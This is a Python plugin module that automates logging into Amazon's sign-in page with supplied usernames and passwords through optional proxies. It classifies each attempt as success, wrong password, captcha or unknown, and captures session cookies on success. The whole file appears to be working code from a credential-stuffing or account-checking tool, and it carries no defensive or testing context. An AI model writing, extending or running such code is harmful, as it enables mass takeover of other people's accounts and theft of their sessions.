from typing import Optional, Dict, Any
import asyncio

from ...core.plugin_interface import WebPlugin, LoginResult, AuthResult, SessionData


class AmazonPlugin(WebPlugin):
    name = "amazon"
    version = "2.0.0"
    
    async def login(self, username: str, password: str,
                   session: Optional[Any] = None,
                   proxy: Optional[str] = None) -> LoginResult:
        import httpx
        
        start = asyncio.get_event_loop().time()
        
        try:
            async with httpx.AsyncClient(proxies=proxy, follow_redirects=True) as client:
                # Get login page
                resp = await client.get(
                    "https://www.amazon.com/ap/signin",
                    params={"openid.return_to": "https://www.amazon.com/"}
                )
                
                from bs4 import BeautifulSoup
                soup = BeautifulSoup(resp.text, 'html.parser')
                form = soup.find('form', {'name': 'signIn'})
                
                if not form:
                    return LoginResult(
                        result=AuthResult.ERROR,
                        username=username,
                        password=password,
                        message="Login form not found"
                    )
                
                # Build form data
                data = {}
                for inp in form.find_all('input'):
                    name = inp.get('name')
                    if name:
                        data[name] = inp.get('value', '')
                
                data['email'] = username
                data['password'] = password
                
                # Submit
                action = form.get('action') or "https://www.amazon.com/ap/signin"
                resp = await client.post(action, data=data)
                
                elapsed = (asyncio.get_event_loop().time() - start) * 1000
                
                text = resp.text.lower()
                url = str(resp.url).lower()
                
                if "sign-out" in text or "hello," in text or "/gp/yourstore" in url:
                    return LoginResult(
                        result=AuthResult.SUCCESS,
                        username=username,
                        password=password,
                        response_time_ms=elapsed,
                        session=SessionData(cookies=dict(client.cookies))
                    )
                
                if "your password is incorrect" in text:
                    return LoginResult(
                        result=AuthResult.FAILURE,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                if "captcha" in text:
                    return LoginResult(
                        result=AuthResult.CAPTCHA,
                        username=username,
                        password=password,
                        response_time_ms=elapsed
                    )
                
                return LoginResult(
                    result=AuthResult.UNKNOWN,
                    username=username,
                    password=password,
                    response_time_ms=elapsed
                )
                
        except Exception as e:
            return LoginResult(
                result=AuthResult.ERROR,
                username=username,
                password=password,
                message=str(e)
            )